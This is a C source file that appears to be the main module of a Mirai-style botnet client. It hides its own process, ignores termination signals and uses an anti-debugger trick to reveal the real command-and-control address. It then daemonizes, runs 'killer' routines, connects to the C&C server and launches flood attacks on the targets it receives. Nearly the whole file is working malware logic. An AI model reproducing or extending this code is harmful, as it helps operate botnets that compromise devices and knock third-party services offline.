#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/poll.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/epoll.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/attack.h"
#include "headers/resolv.h"
#include "headers/killer.h"
#include "headers/tcp.h"
#include "headers/util.h"
#include "headers/locker.h"
#include "headers/debug.h"
#include "headers/CPU.h"
#include "headers/pot.h"
#include "headers/sniffer.h"
#include "headers/telnet.h"
#include "headers/startup.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

/* we init it here SKID */
ipv4_t LOCAL_ADDR;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("[main/err]: got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif

volatile sig_atomic_t is_defending = 0;

void handle_signal(int signum) {
    // Handle the signal here
    // You can perform custom actions or log the event
    // Avoid exiting the process or terminating abruptly
    // You can also set a flag to indicate that the signal was received
    // and take appropriate actions in your code
    is_defending = 1;
}

void defend_binary() {
    // Ignore specific signals that can lead to process termination
    signal(SIGTERM, handle_signal);
    signal(SIGINT, handle_signal);
    signal(SIGQUIT, handle_signal);
    signal(SIGTSTP, SIG_IGN);  // Ignore Ctrl+Z
    signal(SIGTTIN, SIG_IGN);  // Ignore background read attempts
    signal(SIGTTOU, SIG_IGN);  // Ignore background write attempts
}

void main_verify_cnc(char *bot_name, uint8_t id_len) {
    /* 0x0x0x01 (4) + sizeof(id_buf) (32)*/
    uint8_t pkt[4 + 32] = {0};

    util_memcpy(pkt, "\x00\x00\x00\x01", 4);
    util_memcpy(pkt + 4, &id_len, sizeof(uint8_t));
    util_strcpy(pkt + 4 + sizeof(uint8_t), bot_name);

#ifdef DEBUG
    printf("[main] FD%d Sending verify packet len 0x%02x\n", fd_serv, 4 + sizeof(uint8_t) + id_len);
#endif

    send(fd_serv, pkt, 4 + sizeof(uint8_t) + id_len, MSG_NOSIGNAL);
}
#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define LOCALHOST (INET_ADDR(127,0,0,1))
uint32_t LOCAL_ADDR2;
#define INET_ADDR(o1, o2, o3, o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

void ensure(void)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);

    if (fd == -1)
    {
#ifdef DEBUG
        printf("[ensure] socket failed\n");
#endif
        return;
    }

    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("[ensure] setsockopt failed\n");
#endif
        close(fd);
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(7942);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        printf("[ensure] dupe detected\n");
        exit(1);
    }

    if (listen(fd, 1) == -1)
    {
        printf("[ensure] listen failed\n");
        close(fd);
        return;
    }

    printf("[ensure] no dupe\n");
}
void hide_process_from_proc(int pid) {
    char new_dir_path[256];
    snprintf(new_dir_path, sizeof(new_dir_path), "/proc/%d", pid);

    rename("/proc/self", new_dir_path);
}
#define MAX_CMDLINE_LENGTH 256

void hide_process() {
    rand_init();
    // Generate a random command-line name
    const char* charset = "abcdefghijklmnopqrstuvwxyz";
    char cmdline_name[MAX_CMDLINE_LENGTH];
    for (int i = 0; i < 10; i++) {
        int index = rand() % strlen(charset);
        cmdline_name[i] = charset[index];
    }
    cmdline_name[10] = '\0';

    // Get the current process ID
    pid_t pid = getpid();

    // Create a symbolic link to hide the process executable
    char link_path[32];
    char hidden_path[32];
    snprintf(link_path, sizeof(link_path), "/proc/%d/exe", pid);
    snprintf(hidden_path, sizeof(hidden_path), "/tmp/%s", cmdline_name);
    symlink(hidden_path, link_path);

    // Rename the process in the process table
    char new_cmdline[MAX_CMDLINE_LENGTH];
    snprintf(new_cmdline, sizeof(new_cmdline), "%s%c", hidden_path, '\0');
    int cmdline_fd = open("/proc/self/cmdline", O_WRONLY);
    if (cmdline_fd != -1) {
        write(cmdline_fd, new_cmdline, strlen(new_cmdline));
        close(cmdline_fd);
    }

}

int main(int argc, char **args)
{
    char *tbl_exec_succ, id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0, i;
    uint8_t name_buf[32];
   //defend_binary();

    #ifndef DEBUG
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
    #endif

    #ifdef DEBUG
        printf("[main/init]: debug orxy(pid: %d)\n", getpid());

        //sleep(1);

        struct sigaction sa;

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGSEGV, &sa, NULL) == -1)
            perror("sigaction");

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGBUS, &sa, NULL) == -1)
            perror("sigaction");
    #endif
    
    int lol = getpid();
    
    hide_process_from_proc(lol);
    
    hide_process();
    
    ensure();
    
    killer_lol();
    
    killer_boot();
   
    //starttime_init();
   
    //sniffer();
    
    //honeypot();

  //  telnet_scanner_init();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    rand_init();
    

    util_strcpy(args[0], "");

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;

    prctl(PR_SET_NAME, "a");

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
    

    
   // gay();

   // lockdown();

    while (TRUE) {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1) {
#ifdef DEBUG
            printf("[main/conn]: select() (errno: %d)\n", errno);
#endif
            continue;
        } else if (nfds == 0) {
            uint16_t len = 0;

            if ((rand() % 6) == 0)
                send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection) {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr)) {
#ifdef DEBUG
                printf("[main/conn]: timed out while connecting to C&C\n");
#endif
                teardown_connection();
            } else {
                int err = 0;
                socklen_t err_len = sizeof(err);

                int n = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0 || n != 0) {
#ifdef DEBUG
                    printf("[main/conn]: error while connecting to C&C (errno: %d)\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand() % 10) + 1);
                } else {
                    uint8_t id_len = util_strlen(id_buf);

                    uint32_t LOCAL_ADDR = util_local_addr();

                    if (id_len > 0)
                        main_verify_cnc(id_buf, id_len);
#ifdef DEBUG
                    printf("[main/conn]: connected to C&C (addr: %d)\n", LOCAL_ADDR);
#endif
                }
            }
        } else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd)) {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else {
#ifdef DEBUG
                    printf("[main/conn]: lost connection with C&C (errno: %d, stat: 1)\n", errno);
#endif
                    teardown_connection();
                }
            }

            // If n == 0 then we close the connection!
            if (n == 0) {
#ifdef DEBUG
                printf("[main/conn]: lost connection with C&C (errno: %d, stat: 1)\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof(rdbuf)) {
#ifdef DEBUG
                printf("[main/conn]: received buffer length is too large, closing connection\n");
#endif
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);

            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else {
#ifdef DEBUG
                    printf("[main/conn]: lost connection with C&C (errno: %d, stat: 2)\n", errno);
#endif
                    teardown_connection();
                }
            }

            // If n == 0 then we close the connection!
            if (n == 0) {
#ifdef DEBUG
                printf("[main/conn]: lost connection with C&C (errno: %d, stat: 2)\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            if (len == 0) {
                continue;
            }

#ifdef DEBUG
            printf("[main/conn]: received bytes from C&C (len: %d)\n", len);
#endif
            if (n <= 0) {
#ifdef DEBUG
                printf("[main/recv]: recv() failed, closing fd_serv\n");
#endif
                teardown_connection();
                continue;
            }

            struct Attack attack;
            if (attack_parse((const char*)rdbuf, len, &attack) == 0) {
                attack_start(attack.duration, attack.vector, attack.targs_len, attack.targs, attack.opts_len, attack.opts);
                free(attack.targs);
            } else {
#ifdef DEBUG
                printf("[main/conn]: unable to parse attack information\n");
#endif
            }
        }
    }
    
   /*startuplol();
    timingBasedAntiDebugging();
    antiMemoryAnalysis();*/
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    srv_addr.sin_addr.s_addr = CNC_IP;
    srv_addr.sin_port = htons(CNC_PORT);
    srv_addr.sin_family = AF_INET; /* who guarantees this is even ipv4 traffic if we dont set it to be lol */
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main/conn]: attempting to connect to cnc\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main/conn]: failed to call socket() (errno: %d)\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main/teardown]: tearing down connection to C&C!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}
